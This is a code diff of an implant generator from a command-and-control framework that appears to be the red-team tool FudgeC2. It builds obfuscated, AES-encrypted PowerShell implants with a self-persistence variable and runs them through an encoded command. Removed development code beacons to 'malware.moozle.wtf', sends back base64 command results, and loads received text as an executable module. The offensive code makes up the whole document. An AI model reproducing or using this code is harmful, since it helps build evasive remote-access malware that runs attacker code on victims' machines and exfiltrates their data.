@@ -18,6 +18,7 @@ class ImplantGenerator:
 
     ImpFunc = ImplantFunctionality()
     NetProfMan = NetworkProfileManager()
+    StaticEnc = PayloadEncryption()
     module_obfuscation_string = {}
     JinjaRandomisedArgs = {
         "obf_remote_play_audio": "RemotePlayAudio",
@@ -110,7 +111,7 @@ while($true){
     $plh=$null
     $global:headers = $null
     try {
-            {{ proto_core }}
+    {{ proto_core }}
     } catch {
         $_.Exception | Out-Null
     }
@@ -120,7 +121,7 @@ while($true){
             $atr = $global:tr -join "`n"
             $plh = $atr
             try {
-                    {{ proto_core }}
+            {{ proto_core }}
             } catch {
                 $_.Exception | Out-Null
             }
@@ -159,12 +160,10 @@ while($true){
         implant_functions.extend(core_implant_functions)
 
 
-
         ports = {}
         network_profile_functions = {}
-        # -- NEW NETWORK PROFILE CONTENT
-        for x in implant_data['network_profiles']:
-            code, variables = self.NetProfMan.get_implant_powershell_code(x)
+        for profile_name in implant_data['network_profiles']:
+            code, variables = self.NetProfMan.get_implant_powershell_code(profile_name)
 
             obf_variables = variables[0]
             port_variables = variables[1]
@@ -176,7 +175,7 @@ while($true){
             network_profile_functions.update(obf_variables)
 
             for key in port_variables.keys():
-                port_variables[key] = implant_data['network_profiles'][x]
+                port_variables[key] = implant_data['network_profiles'][profile_name]
             ports.update(port_variables)
 
         if implant_data['kill_date'] is not None:
@@ -187,14 +186,31 @@ while($true){
         protocol_string = ""
         proto_count = 0
         for net_prof in network_profile_functions.keys():
-
             protocol_string += f"     {proto_count} {{ {network_profile_functions[net_prof]}($plh) }}\n"
             proto_count += 1
 
-        f_str = 'switch (' + randomised_function_names['obf_select_protocol'] + '(' + str(
-            proto_count) + ') ){ \n' + protocol_string + ' }'
+
+        f_str = f"switch ( {randomised_function_names['obf_select_protocol']}({proto_count})) {{" \
+                f"\n{protocol_string}" \
+                f"\n}}"
 
         return constructed_implant, f_str, ports
+
+    def _encrypt_and_wrap_payload(self, implant_config, payload):
+            # Check if encryption is needed:
+            persistence_variable = "$global:gr = $MyInvocation.MyCommand.ScriptBlock"
+
+            for encryption_mode in implant_config['encryption']:
+                if encryption_mode == "static_encryption":
+                    payload = self.StaticEnc.payload_encryption(payload)
+
+            # Once the payload is encrypted (or not), it will be wrapped with the persistence variable at
+            # the top of the file. This ensure that the encrypted payload is in persistence mechanisms.
+            constructor = f"""{persistence_variable}
+    {payload}
+    """
+            return constructor
+
 
     def generate_implant_from_template(self, implant_data):
         """
@@ -209,13 +225,10 @@ while($true){
         implant_function_names = self._function_name_obfuscation(implant_data, self.JinjaRandomisedArgs)
         implant_template, protocol_switch, ports = self._process_modules(implant_data, implant_function_names)
 
-        a = self.ImpFunc.get_obfucation_string_dict()
-        for key in a.keys():
-            letters = string.ascii_lowercase
-            temp_string = ''.join(random.choice(letters) for i in range(8))
-            if temp_string not in a.values():
-                a[key] = temp_string
-        print(a)
+        # Collect the modules strings - these variables are to be used as function names internally.
+        unobfuscated_modules_string = self.ImpFunc.get_obfucation_string_dict()
+        obfuscated_modules_string = self._function_name_obfuscation(implant_data, unobfuscated_modules_string)
+
 
         callback_url = implant_data['callback_url']
         variable_list = ""
@@ -230,7 +243,7 @@ while($true){
             uii=implant_data['unique_implant_id'],
             stager_key=implant_data['stager_key'],
             ron=implant_function_names,
-            mod_obf=a,
+            mod_obf=obfuscated_modules_string,
             beacon=implant_data['beacon'],
             proto_core=protocol_switch,
             obfuscation_level=implant_data['obfuscation_level'],
@@ -240,143 +253,10 @@ while($true){
         )
 
         # Wrapping implant in function to allow Powershell scope to expose the implant code to itself
-        f_name = f"{random.choice(string.ascii_lowercase)}_{random.choice(string.ascii_lowercase)}"
-        # 'h; is an alias for history....
-        finalised_implant = f"function {f_name}{{ {output_from_parsed_template} }};{f_name}"
-        finalised_implant = self.encrypt_and_wrap_payload(implant_data, finalised_implant)
-        return finalised_implant
-
-    def _static_encryption(self, raw_implant):
-        ct = None
-        key = None
-        iv = None
-        encryption_details = PayloadEncryption.encrypt_with_static_aes(raw_implant)
-        powershell_decryption = f'''
-function Create-AesManagedObject($key, $IV) {{
-    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
-    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-    $aesManaged.BlockSize = 128
-    $aesManaged.KeySize = 256
-    if ($IV) {{
-        if ($IV.getType().Name -eq "String") {{
-            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
-        }}
-        else {{
-            $aesManaged.IV = $IV
-        }}
-    }}
-    if ($key) {{
-        if ($key.getType().Name -eq "String") {{
-            $aesManaged.Key = [System.Convert]::FromBase64String($key)
-        }}
-        else {{
-            $aesManaged.Key = $key
-        }}
-    }}
-    $aesManaged
-}}
-
-function dcc($key, $iv, $ct){{
-    $byte_ct = [System.Convert]::FromBase64String($ct)
-    $bytes = [System.Convert]::FromBase64String($ct)
-    $aesManaged = Create-AesManagedObject $key $iv
-    $decryptor = $aesManaged.CreateDecryptor();
-    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
-    $aesManaged.Dispose()
-    $unencryptedData.GetType()
-    $a = [System.Text.Encoding]::UTF8.GetString($unencryptedData) #.Trim([char]0)
-    $a
-}}
-$key = "{encryption_details['key']}" 
-$ct = "{encryption_details['ciphertext']}"
-$iv = "{encryption_details['iv']}"
-$ggwp = dcc $key $iv $ct        
-'''
-        print("Encrypting the FudgeC2 payload:")
-
-        # Payload
-        # decryptor
-        # executor
-        return powershell_decryption
-
-    def encrypt_and_wrap_payload(self, implant_config, raw_implant):
-        # Check if encryption is needed:
-        persistence_variable = "$global:gr = $MyInvocation.MyCommand.ScriptBlock"
-        for encryption_mode in implant_config['encryption']:
-            if encryption_mode == "static_encryption":
-                raw_implant = self._static_encryption(raw_implant)
-        encoded_implant = base64.b64encode(raw_implant.encode()).decode()
-        costructor = f"""{persistence_variable}
-$a = "{encoded_implant}"
-powershell.exe -encodedCommand $a
-"""
-        return costructor
-
-    def _network_encryption(self, data):
-        # DEV WORK FOR PAYLOAD ENCRYPTION
-        # data type == string
-        d = base64.b64encode(data.encode()).decode()
-        id = "abcde"
-
-        network_profile = """
-function connection($b){
-    if ( $b -eq $null ){
-        $URL = "http://"+$url+":1234/index"
-        $r = iwr -uri $URL -headers @{"X-Implant" = "aaaa"} -method 'GET' -UseBasicParsing
-        $global:headers = $r.Content
-    } else {
-        $URL = "http://"+$url+":1234/help"
-        $enc = [system.Text.Encoding]::UTF8
-        $data2 = [System.Convert]::ToBase64String($enc.GetBytes($b))
-        $data2 = $global:command_id+$data2
-        $r = iwr -uri $URL -method 'POST' -headers @{"X-Result"= "{{ uii }}"} -body $data2 -UseBasicParsing
-        $global:headers = $r.Content
-    }
-}
-"""
-        persistence_variable = "$global:gr = $MyInvocation.MyCommand.ScriptBlock"
-
-        data_2 = f"""
-{ persistence_variable }
-$a = "{d}"
-
-function get_key(){{
-    $d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($source))
-    $b = [ScriptBlock]::Create($d)
-    #write-host $global:gg
-    New-Module -ScriptBlock $b -Name "aaaa" | Import-Module
-    Get-Command -Module aaaa
-}}
-
-{network_profile}
-
-$url = "malware.moozle.wtf"
-$id = "{id}"
-$awaiting_key = $null
-while ($awaiting_key -ne $null){{
-    connection
-    if ($global:headers -ne "=="){{
-        $awaiting_key == $true
-        
-    }}
-    Start-Sleep 1
-}}
-get_key($global:headers)
-
-"""
-
-        print(data_2)
-        return data_2
-
-# redesign and improvement - Consider the impact of the change to dotnet
-
-# Collect data ( modules, obfuscation key/pairs network, profiles.)
-# Configure anything pre-compile (obfuscation etc)
-# Compile
-# Inject variables
-# Layering
-
+        func_name = f"{random.choice(string.ascii_lowercase)}_{random.choice(string.ascii_lowercase)}"
+        unencrypted_implant = f"function {func_name}{{ {output_from_parsed_template} }};{func_name}"
+        finalised_implant = self._encrypt_and_wrap_payload(implant_data, unencrypted_implant)
+        return finalised_implant, unencrypted_implant
 
 
 
